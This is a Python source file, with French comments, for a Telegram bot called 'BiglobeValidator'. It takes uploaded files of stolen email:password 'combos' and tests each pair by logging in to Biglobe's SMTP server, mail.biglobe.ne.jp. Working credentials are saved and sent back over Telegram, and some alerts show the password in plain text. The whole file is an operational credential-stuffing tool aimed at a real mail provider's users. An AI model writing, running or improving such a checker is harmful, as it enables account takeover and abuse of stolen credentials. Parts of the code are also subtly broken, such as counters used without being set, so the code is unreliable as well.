import smtplib
import ssl
import threading
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
    ConversationHandler
)
from datetime import datetime
from dotenv import load_dotenv
import telegram
import asyncio
import requests
import tempfile
from typing import Optional, Dict, List, Any

class BotManager:
    def __init__(self):
        # Chargement des variables d'environnement
        load_dotenv()

        # Configuration par défaut
        self.THREADS = 200  # Nombre de threads pour traiter 200 combos en parallèle
        self.SMTP_SERVER = "mail.biglobe.ne.jp"
        self.SMTP_PORT = 587
        self.DELAY_BETWEEN_CHECKS = 30  # secondes entre chaque tentative
        self.STATS_INTERVAL = 60
        self.MAX_RETRIES = 1  # Une seule tentative par combo
        self.BATCH_SIZE = 200  # Taille des lots de traitement
        self.CONNECTION_TIMEOUT = 30  # Timeout de connexion de 30 secondes
        self.PERFORMANCE_MODE = True  # Mode performance activé
        
        # Configuration Telegram
        self.TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
        self.TELEGRAM_CHAT_ID = int(os.getenv('TELEGRAM_CHAT_ID', ''))
        
        # États de la conversation
        self.WAITING_FOR_COMBOS = 1
        self.WAITING_FOR_OUTPUT = 2
        self.WAITING_FOR_EMAIL = 3
        self.WAITING_FOR_CONFIRMATION = 4
        
        # État global
        self.bot_state = {
            'waiting_for_list': False,
            'waiting_for_output': False,
            'waiting_for_email': False,
            'input_file': '',
            'output_file': '',
            'receiver_email': '',
            'combos': [],
            'is_running': False,
            'last_valid': None,
            'valid_count': 0,
            'invalid_count': 0
        }

        # Statut global
        self.bot_status = {
            "online": True,
            "last_check": datetime.now(),
            "current_task": "En attente"
        }
        
        # Verrous
        self.valid_lock = threading.Lock()
        self.print_lock = threading.Lock()
        
        # Variables globales
        self.valid_results = []
        self.remaining = 0
        self.telegram_bot = None
        self.total_combos = 0
        self.start_time = None
        self.last_stats_time = 0
        
        # Application Telegram
        self.application: Optional[Application] = None

    def print_banner(self):
        print(r"""
  ____  _       _ _           _           
 | __ )(_) __ _(_) | ___  ___| |_ ___ _ __ 
 |  _ \| |/ _` | | |/ _ \/ __| __/ _ \ '__|
 | |_) | | (_| | | |  __/\__ \ ||  __/ |   
 |____/|_|\__, |_|_|\___||___/\__\___|_|   
          |___/         BiglobeValidator v1.0
        """)

    async def check_telegram_connection(self) -> bool:
        """Vérifie la connexion à l'API Telegram"""
        print("🔌 Test de connexion à l'API Telegram...")
        try:
            bot = telegram.Bot(token=self.TELEGRAM_BOT_TOKEN)
            bot_info = await bot.get_me()
            print(f"✅ Connecté à l'API Telegram en tant que : {bot_info.username}")
            print(f"✅ ID du bot : {bot_info.id}")
            print(f"✅ Chat ID : {self.TELEGRAM_CHAT_ID}")
            
            # Vérifier si le bot est dans le chat
            try:
                chat_member = await bot.get_chat_member(self.TELEGRAM_CHAT_ID, bot_info.id)
                print(f"✅ Statut du bot dans le chat : {chat_member.status}")
            except Exception as e:
                print(f"❌ Le bot n'est pas dans le chat ou n'a pas accès : {str(e)}")
                return False
                
            return True
        except Exception as e:
            print(f"❌ Erreur de connexion à l'API Telegram : {str(e)}")
            return False

    async def start(self):
        """Démarre le bot"""
        try:
            self.print_banner()
            print("🚀 Démarrage du bot...")
            
            # Vérification des variables d'environnement
            if not self.TELEGRAM_BOT_TOKEN:
                raise ValueError("Token du bot manquant dans le fichier .env")
            if not self.TELEGRAM_CHAT_ID:
                raise ValueError("Chat ID manquant dans le fichier .env")
                
            print(f"🔑 Token du bot : {self.TELEGRAM_BOT_TOKEN}")
            print(f"📱 Chat ID : {self.TELEGRAM_CHAT_ID}")
            
            # Vérification de la connexion
            if not await self.check_telegram_connection():
                print("⚠️ Le bot n'est pas correctement configuré")
                print("⚠️ Veuillez vérifier que :")
                print("1. Le bot est ajouté au chat")
                print("2. Le bot a les permissions nécessaires")
                print("3. Le Chat ID est correct")
                return
            
            # Création de l'application
            print("⚙️ Configuration de l'application...")
            self.application = Application.builder().token(self.TELEGRAM_BOT_TOKEN).build()

            # Configuration des gestionnaires
            print("⚙️ Configuration des gestionnaires...")
            self._setup_handlers()

            # Configuration des tâches périodiques
            print("⚙️ Configuration des tâches périodiques...")
            self._setup_jobs()

            print("✅ Bot configuré et prêt")
            print("📡 Démarrage du polling...")

            # Démarrage du bot
            await self.application.initialize()
            await self.application.start()
            await self.application.updater.start_polling()
            
            print("✅ Bot démarré et en attente des messages...")
            
            # Garder le bot en vie
            while True:
                await asyncio.sleep(1)

        except Exception as e:
            print(f"❌ Erreur inattendue : {str(e)}")
            print(f"Type d'erreur : {type(e)}")
            print(f"Détails : {e.__dict__ if hasattr(e, '__dict__') else 'Pas de détails'}")
        finally:
            print("⚠️ Arrêt du bot...")
            if self.application:
                await self.application.stop()

    def _setup_handlers(self):
        """Configure les gestionnaires de commandes et de messages"""
        if not self.application:
            raise ValueError("Application non initialisée")

        # Gestionnaire de conversation
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler('combo', self.combo)],
            states={
                self.WAITING_FOR_COMBOS: [
                    MessageHandler(filters.Document.TXT, self.receive_combos),
                    MessageHandler(filters.TEXT & ~filters.COMMAND, 
                                 lambda update, context: update.message.reply_text("❌ Veuillez envoyer un fichier .txt"))
                ],
                self.WAITING_FOR_OUTPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.receive_output)],
                self.WAITING_FOR_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.receive_email)],
                self.WAITING_FOR_CONFIRMATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.confirm_verification)]
            },
            fallbacks=[CommandHandler('cancel', self.cancel)]
        )

        # Ajout des gestionnaires
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("status", self.status_command))
        self.application.add_handler(conv_handler)

    def _setup_jobs(self):
        """Configure les tâches périodiques"""
        if not self.application:
            raise ValueError("Application non initialisée")
            
        job_queue = self.application.job_queue
        job_queue.run_repeating(self.update_status_job, interval=300, first=0)

    # Méthodes de gestion des commandes
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Gère la commande /start"""
        print(f"👤 Nouvel utilisateur : {update.effective_user.id}")
        await update.message.reply_text('Bonjour ! Je suis votre bot. Utilisez /help pour voir les commandes disponibles.')

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Gère la commande /help"""
        help_text = """
Commandes disponibles :
/start - Démarrer le bot
/help - Afficher cette aide
/combo - Lancer la vérification de combos Biglobe
/status - Vérifier le statut du bot
        """
        await update.message.reply_text(help_text)

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Gère la commande /status"""
        try:
            status_message = f"""
🤖 Statut actuel :
- Bot : ✅ En ligne
- Tâche en cours : {self.bot_status["current_task"]}
- Dernière vérification : {self.bot_status["last_check"].strftime("%H:%M:%S")}
- Heure actuelle : {datetime.now().strftime("%H:%M:%S")}
            """
            await update.message.reply_text(status_message)
        except Exception as e:
            print(f"❌ Erreur de statut : {str(e)}")
            await update.message.reply_text(f"❌ Erreur : {str(e)}")

    async def combo(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Gère la commande /combo"""
        print(f"📥 Commande /combo reçue de {update.effective_user.id}")
        self.bot_status["current_task"] = "En attente d'un fichier de combos"
        await update.message.reply_text("📁 Envoyez-moi votre fichier de combos (.txt)")
        return self.WAITING_FOR_COMBOS

    async def receive_combos(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Gère la réception des fichiers de combos"""
        try:
            print(f"📄 Tentative de réception de fichier de {update.effective_user.id}")
            
            if not update.message or not update.message.document:
                print("❌ Pas de document dans le message")
                await update.message.reply_text("❌ Veuillez envoyer un fichier .txt valide")
                return self.WAITING_FOR_COMBOS
                
            file_name = update.message.document.file_name
            print(f"📋 Document reçu : {file_name}")
            
            if not file_name.endswith('.txt'):
                print("❌ Le fichier n'est pas un .txt")
                await update.message.reply_text("❌ Veuillez envoyer un fichier .txt valide")
                return self.WAITING_FOR_COMBOS
            
            self.bot_status["current_task"] = "Téléchargement du fichier"
            await update.message.reply_text("⏳ Téléchargement du fichier en cours...")
            
            # Télécharger le fichier
            file = await context.bot.get_file(update.message.document.file_id)
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.txt')
            
            print(f"📥 Téléchargement vers : {temp_file.name}")
            await file.download_to_drive(temp_file.name)
            
            # Vérifier que le fichier a bien été téléchargé
            if not os.path.exists(temp_file.name):
                print("❌ Le fichier n'a pas été sauvegardé correctement")
                await update.message.reply_text("❌ Erreur lors de la sauvegarde du fichier")
                return self.WAITING_FOR_COMBOS
                
            # Vérifier que le fichier n'est pas vide
            if os.path.getsize(temp_file.name) == 0:
                print("❌ Le fichier est vide")
                await update.message.reply_text("❌ Le fichier est vide")
                os.unlink(temp_file.name)
                return self.WAITING_FOR_COMBOS
                
            # Lire le contenu du fichier pour vérification
            with open(temp_file.name, 'r', encoding='utf-8') as f:
                content = f.read()
                print(f"📊 Taille du contenu : {len(content)} caractères")
                print(f"📊 Premières lignes : {content[:200]}...")
            
            context.user_data['input_file'] = temp_file.name
            print(f"✅ Fichier sauvegardé avec succès : {temp_file.name}")
            
            self.bot_status["current_task"] = "En attente du nom du fichier de sortie"
            await update.message.reply_text("📝 Entrez le nom du fichier de sortie pour les combos valides :")
            return self.WAITING_FOR_OUTPUT
            
        except Exception as e:
            print(f"❌ Erreur lors de la réception du fichier : {str(e)}")
            print(f"❌ Type d'erreur : {type(e)}")
            print(f"❌ Détails de l'erreur : {e.__dict__ if hasattr(e, '__dict__') else 'Pas de détails'}")
            await update.message.reply_text(f"❌ Erreur lors de la réception du fichier : {str(e)}")
            return self.WAITING_FOR_COMBOS

    async def receive_output(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Gère la réception du nom du fichier de sortie"""
        output_file = update.message.text.strip()
        if not output_file.endswith('.txt'):
            output_file += '.txt'
        context.user_data['output_file'] = output_file
        
        print(f"📝 Nom du fichier de sortie : {output_file}")
        
        self.bot_status["current_task"] = "En attente de l'email de test"
        await update.message.reply_text("📧 Entrez l'email de réception pour les tests :")
        return self.WAITING_FOR_EMAIL

    async def receive_email(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Gère la réception de l'email de test"""
        try:
            email = update.message.text.strip()
            if not email or '@' not in email:
                await update.message.reply_text("❌ Veuillez entrer un email valide")
                return self.WAITING_FOR_EMAIL
                
            context.user_data['test_email'] = email
            print(f"📧 Email de test reçu : {email}")
            
            self.bot_status["current_task"] = "En attente de confirmation"
            await update.message.reply_text(
                f"📧 Email de test : {email}\n"
                "Voulez-vous commencer la vérification ? (oui/non)"
            )
            return self.WAITING_FOR_CONFIRMATION
            
        except Exception as e:
            print(f"❌ Erreur lors de la réception de l'email : {str(e)}")
            await update.message.reply_text("❌ Erreur lors de la réception de l'email")
            return self.WAITING_FOR_EMAIL

    async def confirm_verification(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Gère la confirmation de la vérification"""
        try:
            response = update.message.text.lower().strip()
            if response not in ['oui', 'non']:
                await update.message.reply_text("❌ Veuillez répondre par 'oui' ou 'non'")
                return self.WAITING_FOR_CONFIRMATION
                
            if response == 'non':
                await update.message.reply_text("❌ Vérification annulée")
                return ConversationHandler.END
                
            self.bot_status["current_task"] = "Préparation du traitement"
            processing_msg = await update.message.reply_text("⏳ Préparation de la vérification...")
            
            try:
                # Vérifier que le fichier existe
                if 'input_file' not in context.user_data:
                    raise ValueError("Fichier d'entrée non trouvé")
                
                # Lire le fichier d'entrée
                with open(context.user_data['input_file'], 'r', encoding='utf-8') as f:
                    combos = [line.strip() for line in f if ":" in line]
                
                if not combos:
                    raise ValueError("Le fichier est vide")
                
                print(f"📊 Nombre de combos à traiter : {len(combos)}")
                
                # Initialiser les variables globales
                self.valid_results = []
                self.remaining = len(combos)
                self.total_combos = len(combos)
                self.start_time = time.time()
                self.last_stats_time = time.time()
                
                # Afficher les premiers combos pour vérification
                print("📋 Premiers combos du fichier :")
                for i, combo in enumerate(combos[:5]):
                    print(f"  {i+1}. {combo}")
                
                # Traiter les combos par lots
                valid_combos = await self.process_combos(combos, context.user_data['test_email'])
                
                print(f"✅ Combos valides trouvés : {len(valid_combos)}")
                
                if not valid_combos:
                    raise ValueError("Aucun combo valide trouvé")
                
                # Sauvegarder les combos valides
                output_path = os.path.join(os.getcwd(), context.user_data['output_file'])
                with open(output_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(valid_combos))
                
                print(f"💾 Résultats sauvegardés dans : {output_path}")
                
                result_message = f"""
✅ Vérification terminée :
- Fichier d'entrée : {os.path.basename(context.user_data['input_file'])}
- Fichier de sortie : {context.user_data['output_file']}
- Email de test : {context.user_data['test_email']}
- Combos traités : {len(combos)}
- Combos valides trouvés : {len(valid_combos)}
                """
                await update.message.reply_text(result_message)
                await processing_msg.edit_text("✅ Vérification terminée avec succès !")
                
                # Envoyer le fichier sur Telegram
                with open(output_path, 'rb') as f:
                    print("📤 Envoi du fichier de résultats...")
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        filename=context.user_data['output_file'],
                        caption="📁 Voici le fichier de sortie avec les combos valides"
                    )
                
                # Nettoyer
                os.unlink(output_path)
                print("🧹 Fichier de résultats supprimé")
                
            except Exception as e:
                print(f"❌ Erreur lors du traitement : {str(e)}")
                await update.message.reply_text(f"❌ Erreur lors du traitement : {str(e)}")
            
            # Nettoyer
            if 'input_file' in context.user_data:
                os.unlink(context.user_data['input_file'])
                print("🧹 Fichier d'entrée supprimé")
            context.user_data.clear()
            self.bot_status["current_task"] = "En attente"
            
            return ConversationHandler.END
            
        except Exception as e:
            print(f"❌ Erreur lors de la confirmation : {str(e)}")
            await update.message.reply_text("❌ Erreur lors de la confirmation")
            return ConversationHandler.END

    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Gère l'annulation de l'opération en cours"""
        print(f"❌ Opération annulée par {update.effective_user.id}")
        self.bot_status["current_task"] = "Opération annulée"
        await update.message.reply_text("❌ Opération annulée")
        if 'input_file' in context.user_data:
            os.unlink(context.user_data['input_file'])
            print("🧹 Fichier d'entrée supprimé")
        context.user_data.clear()
        self.bot_status["current_task"] = "En attente"
        return ConversationHandler.END

    async def update_status_job(self, context: ContextTypes.DEFAULT_TYPE):
        """Met à jour le statut du bot"""
        try:
            self.bot_status["last_check"] = datetime.now()
            
            # Envoyer un message de statut
            status_message = f"""
🤖 Statut en temps réel :
- Bot : ✅ En ligne
- Tâche en cours : {self.bot_status["current_task"]}
- Dernière vérification : {self.bot_status["last_check"].strftime("%H:%M:%S")}
            """
            await context.bot.send_message(chat_id=self.TELEGRAM_CHAT_ID, text=status_message)
            
        except Exception as e:
            print(f"❌ Erreur de statut : {str(e)}")

    async def send_test_mail(self, email: str, password: str, receiver: str) -> bool:
        """Teste la connexion SMTP avec les identifiants fournis"""
        try:
            context = ssl.create_default_context()
            with smtplib.SMTP(self.SMTP_SERVER, self.SMTP_PORT, timeout=self.CONNECTION_TIMEOUT) as server:
                server.ehlo()
                server.starttls(context=context)
                server.ehlo()
                server.login(email, password)
                return True

        except smtplib.SMTPAuthenticationError:
            return False

        except (smtplib.SMTPServerDisconnected, smtplib.SMTPException) as e:
            return False

        except Exception as e:
            return False

    async def send_telegram_message(self, message: str) -> None:
        """Envoie un message sur Telegram"""
        try:
            print(f"📤 Tentative d'envoi de message Telegram : {message[:50]}...")
            
            # Vérifier que le token et le chat ID sont configurés
            if not self.TELEGRAM_BOT_TOKEN or not self.TELEGRAM_CHAT_ID:
                print("❌ Token ou Chat ID non configuré")
                return
                
            # Initialiser le bot si nécessaire
            if not self.telegram_bot:
                print("🤖 Initialisation du bot Telegram...")
                self.telegram_bot = Bot(token=self.TELEGRAM_BOT_TOKEN)
            
            # Envoyer le message
            print(f"📱 Envoi du message au chat {self.TELEGRAM_CHAT_ID}...")
            await self.telegram_bot.send_message(
                chat_id=self.TELEGRAM_CHAT_ID,
                text=message,
                parse_mode='HTML'
            )
            print("✅ Message envoyé avec succès")
            
        except Exception as e:
            print(f"❌ Erreur lors de l'envoi du message Telegram : {str(e)}")
            print(f"❌ Type d'erreur : {type(e)}")
            print(f"❌ Détails de l'erreur : {e.__dict__ if hasattr(e, '__dict__') else 'Pas de détails'}")
            # On continue même en cas d'erreur pour ne pas bloquer le traitement

    async def send_stats(self) -> None:
        """Envoie les statistiques de vérification"""
        current_time = time.time()
        
        if current_time - self.last_stats_time >= self.STATS_INTERVAL:
            elapsed_time = current_time - self.start_time
            processed = self.total_combos - self.remaining
            valid_count = len(self.valid_results)
            invalid_count = self.invalid_count
            timeout_count = self.timeout_count
            speed = processed / elapsed_time if elapsed_time > 0 else 0
            
            stats_message = f"""
📊 STATISTIQUES EN DIRECT 📊
━━━━━━━━━━━━━━━━━━━━
⏱️ Temps écoulé: {int(elapsed_time/60)}m {int(elapsed_time%60)}s
📈 Progression: {processed}/{self.total_combos} ({int((processed/self.total_combos)*100)}%)
✅ Valides: {valid_count}
❌ Invalides: {invalid_count}
⏳ Timeouts: {timeout_count}
🚀 Vitesse: {speed:.2f} combos/min
⏳ Temps estimé restant: {int((self.remaining/speed)/60)}m {int((self.remaining/speed)%60)}s
━━━━━━━━━━━━━━━━━━━━
💻 By @JYMMI10K
"""
            await self.send_telegram_message(stats_message)
            self.last_stats_time = current_time

    async def send_progress_update(self, processed: int, total: int, valid: int, invalid: int) -> None:
        """Envoie une mise à jour de progression sur Telegram"""
        if not self.telegram_bot:
            self.telegram_bot = Bot(token=self.TELEGRAM_BOT_TOKEN)
        
        progress = (processed / total) * 100 if total > 0 else 0
        elapsed_time = time.time() - self.start_time if self.start_time else 0
        
        status_message = (
            f"📊 Progression : {processed}/{total} ({progress:.1f}%)\n"
            f"✅ Valides : {valid}\n"
            f"❌ Invalides : {invalid}\n"
            f"⏱ Temps écoulé : {elapsed_time:.1f}s\n"
            f"🚀 Vitesse : {processed/elapsed_time:.1f} vérifications/s" if elapsed_time > 0 else "Démarrage..."
        )
        
        try:
            await self.telegram_bot.send_message(
                chat_id=self.TELEGRAM_CHAT_ID,
                text=status_message,
                parse_mode='HTML'
            )
        except Exception as e:
            print(f"[!] Erreur mise à jour Telegram: {e}")

    async def process_combo(self, combo: str, receiver: str) -> Optional[str]:
        """Traite un combo et vérifie sa validité"""
        try:
            print(f"🔍 Vérification du combo : {combo}")
            
            # Vérifier le format du combo
            if ":" not in combo:
                print("❌ Format de combo invalide")
                return None
                
            email, password = combo.split(":", 1)
            
            # Vérifier le format de l'email
            if "@" not in email or "." not in email:
                print("❌ Format d'email invalide")
                return None
                
            # Vérifier la longueur du mot de passe
            if len(password) < 4:
                print("❌ Mot de passe trop court")
                return None
                
            # Tester la connexion SMTP
            print("⏳ Test de connexion SMTP...")
            is_valid = await self.send_test_mail(email, password, receiver)
            
            if is_valid:
                print(f"✅ Combo valide : {email}")
                return combo
            else:
                print(f"❌ Combo invalide : {email}")
                return None
                
        except Exception as e:
            print(f"❌ Erreur lors du traitement : {str(e)}")
            return None

    def load_combos(self, filepath: str) -> List[str]:
        """Charge les combos depuis un fichier"""
        with open(filepath, "r") as f:
            return [line.strip() for line in f if ":" in line]

    def save_valid_results(self, filepath: str, results: List[str]) -> bool:
        """Sauvegarde les résultats valides dans un fichier"""
        try:
            with open(filepath, "w") as f:
                f.writelines(result + "\n" for result in results)
        except Exception as e:
            print(f"[!] Erreur lors de la sauvegarde des résultats : {e}")
            return False
        return True

    async def process_combos(self, combos: List[str], receiver: str) -> List[str]:
        """Traite les combos un par un avec un délai de 30 secondes"""
        print("🔄 Début du traitement des combos")
        valid_results = []
        total = len(combos)
        print(f"📊 Nombre total de combos à traiter : {total}")
        
        for i, combo in enumerate(combos):
            try:
                print(f"\n🔍 Traitement du combo {i+1}/{total}")
                print(f"📝 Combo : {combo}")
                
                # Message de début
                start_msg = f"🔍 Début du traitement du combo {i+1}/{total}"
                print(start_msg)
                await self.send_telegram_message(start_msg)
                
                # Traitement du combo
                print("⏳ Tentative de connexion...")
                result = await self.process_combo(combo, receiver)
                
                # Résultat
                if result:
                    print(f"✅ Combo valide : {result}")
                    valid_results.append(result)
                else:
                    print("❌ Combo invalide")
                
                # Message de fin
                end_msg = f"📊 Résultat du combo {i+1}/{total} : {'Valide' if result else 'Invalide'}"
                print(end_msg)
                await self.send_telegram_message(end_msg)
                
                # Attente
                print("⏳ Attente de 30 secondes...")
                await asyncio.sleep(30)
                
            except Exception as e:
                print(f"❌ Erreur sur le combo {combo} : {str(e)}")
                continue
        
        print(f"\n✅ Traitement terminé. {len(valid_results)} combos valides trouvés.")
        return valid_results

    async def optimize_performance(self):
        """Optimise les performances en fonction de la charge"""
        if not self.PERFORMANCE_MODE:
            return
            
        # Ajustement dynamique des threads
        current_load = len(self.valid_results) + self.invalid_count
        if current_load > 1000:
            self.THREADS = min(30, self.THREADS + 5)
        elif current_load < 500:
            self.THREADS = max(10, self.THREADS - 5)
            
        # Ajustement du délai
        if self.invalid_count > self.valid_results * 2:
            self.DELAY_BETWEEN_CHECKS = min(60, self.DELAY_BETWEEN_CHECKS + 5)
        else:
            self.DELAY_BETWEEN_CHECKS = max(30, self.DELAY_BETWEEN_CHECKS - 5)

    async def validate_combo(self, email: str, password: str) -> None:
        """Valide un combo Biglobe"""
        try:
            if await self.send_test_mail(email, password, "test@example.com"):
                with self.print_lock:
                    self.valid_results.append(f"{email}:{password}")
                    if len(self.valid_results) % 10 == 0:  # Message tous les 10 valides
                        valid_message = f"""
✅ NOUVEAU COMBO VALIDE ✅
━━━━━━━━━━━━━━━━━━━━
📧 Email: {email}
🔑 Password: {password}
📊 Total valides: {len(self.valid_results)}
━━━━━━━━━━━━━━━━━━━━
💻 By @JYMMI10K
"""
                        await self.send_telegram_message(valid_message)
            else:
                with self.print_lock:
                    self.invalid_count += 1
        except Exception as e:
            with self.print_lock:
                self.timeout_count += 1
        finally:
            self.remaining -= 1

async def main():
    """Point d'entrée principal"""
    bot_manager = BotManager()
    await bot_manager.start()


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⚠️ Arrêt du bot par l'utilisateur...")
    except Exception as e:
        print(f"❌ Erreur fatale : {str(e)}")
